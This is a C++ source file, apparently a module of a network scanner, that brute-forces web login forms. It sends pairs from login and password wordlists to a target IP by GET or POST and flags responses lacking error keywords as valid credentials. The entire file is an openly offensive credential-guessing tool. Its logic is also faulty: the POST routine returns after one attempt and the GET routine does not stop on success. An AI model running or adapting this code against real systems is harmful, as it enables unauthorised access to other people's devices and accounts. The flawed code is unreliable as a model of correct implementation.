#include "WebformWorker.h"
#include "FileUpdater.h"

lopaStr WFClass::parseResponse(const char *ip,
                               const int port,
                               const std::string *buffer,
                               const char* formVal,
                               const char *login,
                               const char *pass) {

    lopaStr result = {"UNKNOWN", "", ""};

    if(buffer->size() != 0)
    {
        if(Utils::ustrstr(*buffer, std::string(formVal)) == -1
                && Utils::ustrstr(*buffer, std::string("denied")) == -1
                && Utils::ustrstr(*buffer, std::string("Location:")) == -1
                && Utils::ustrstr(*buffer, std::string("Authentication required")) == -1
                && Utils::ustrstr(*buffer, std::string("invalid")) == -1
                && Utils::ustrstr(*buffer, std::string("err")) == -1
                && Utils::ustrstr(*buffer, std::string(".href")) == -1
                && Utils::ustrstr(*buffer, std::string(".replace")) == -1
                && Utils::ustrstr(*buffer, std::string(".location")) == -1
                && Utils::ustrstr(*buffer, std::string("501 not implemented")) == -1
                && Utils::ustrstr(*buffer, std::string("http-equiv")) == -1
                && Utils::ustrstr(*buffer, std::string("busy")) == -1
                && Utils::ustrstr(*buffer, std::string("later")) == -1
                && Utils::ustrstr(*buffer, std::string("forbidden")) == -1
                ) {

            strcpy(result.login, login);
            strcpy(result.pass, pass);
            return result;

        } else {

            if(Utils::ustrstr(*buffer, std::string("501 not implemented")) != -1) stt->doEmitionRedFoundData("<a href=\"" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");

            if(Utils::ustrstr(*buffer, std::string("404 not found")) != -1) stt->doEmitionRedFoundData("<a href=\"" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");

            return result;
        }
    }
    else return result;
}

lopaStr WFClass::doGetCheck(const char *ip,
                                  int port,
                                  char *actionVal,
                                  char *userVal,
                                  char *passVal,
                                  char *formVal) {

    lopaStr result = {"UNKNOWN", "", ""};
    int passCounter = 0;
    int firstCycle = 0;
	int rowIndex = -1;

    char login[128] = {0};
    char pass[32] = {0};

    for(int i = 0; i < MaxWFLogin; ++i)
    {
        if(!globalScanFlag) break;
        strcpy(login, wfLoginLst[i]);

        for(int j = firstCycle; j < MaxWFPass; ++j)
        {
            if(!globalScanFlag) break;
            strcpy(pass, wfPassLst[j]);

            int rSize = strlen(ip) + strlen(actionVal) + strlen(userVal) + strlen(login) + strlen(passVal) + strlen(pass) + 4;

            if(rSize > 256) {
                stt->doEmitionRedFoundData("[WF] Wrong request size! (" + QString(ip) + ":" + QString::number(port) + ")");
                return result;
            };

            char nip[256] = {0};
            sprintf(nip, "%s%s?%s=%s&%s=%s", ip, actionVal, userVal, login, passVal, pass);

			std::string buffer;
			Connector con;
            if(con.nConnect(nip, port, &buffer) <= 0) return result;

			rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), QString::number((++passCounter / (double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%", rowIndex);

            result = parseResponse(ip, port, &buffer, formVal, login, pass);
            if(i == 0) ++i;
        }
        firstCycle = 1;
    }

    return result;
}

lopaStr WFClass::doPostCheck(const char *ip,
                                   int port,
                                   char *actionVal,
                                   char *userVal,
                                   char *passVal,
                                   char *formVal) {

    lopaStr result = {"UNKNOWN", "", ""};
    int passCounter = 0;
    int firstCycle = 0;
	int rowIndex = -1;

    char login[128] = {0};
    char pass[32] = {0};

    for(int i = 0; i < MaxWFLogin; ++i)
    {
        if(!globalScanFlag) break;
        strcpy(login, wfLoginLst[i]);

        for(int j = firstCycle; j < MaxWFPass; ++j)
        {
            if(!globalScanFlag) break;
            strcpy(pass, wfPassLst[j]);

            int rSize = strlen(ip) + strlen(actionVal) + strlen(userVal) + strlen(login) + strlen(passVal) + strlen(pass) + 4;

            if(rSize > 256) {
                stt->doEmitionRedFoundData("[WF] Wrong request size! (" + QString(ip) + ":" + QString::number(port) + ")");
                return result;
            };

            char nip[256] = {0};
            char postData[256] = {0};
            sprintf(nip, "%s%s", ip, actionVal);
            sprintf(postData, "%s=%s&%s=%s", userVal, login, passVal, pass);

            std::string buffer;
			Connector con;
			if (con.nConnect(nip, port, &buffer, postData) <= 0) return result;			

			rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), QString::number((++passCounter / (double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%", rowIndex);
            ++passCounter;

            return parseResponse(ip, port, &buffer, formVal, login, pass);
            if(i == 0) ++i;
        }
        firstCycle = 1;
    }

    return result;
}

lopaStr WFClass::_WFBrute( const char *ip,
                                int port,
                                char *methodVal,
                                char *actionVal,
                                char *userVal,
                                char *passVal,
                                char *formVal) {

    lopaStr lps = {"UNKNOWN", "", ""};

    if(strstri(methodVal, "get") != NULL) {
        lps = doGetCheck(ip, port, actionVal, userVal, passVal, formVal);
    } else if(strstri(methodVal, "post") != NULL) {
        lps = doPostCheck(ip, port, actionVal, userVal, passVal, formVal);
    } else {
        stt->doEmitionFoundData("<a href=\"" + QString(ip) +
                                ":" + QString::number(port)
                                + "\"><font color=\"#c3c3c3\">" +
                                QString(ip) + ":" + QString::number(port) +
                                "</font></a> - [WF]: Unknown method.");
    };

    return lps;
}
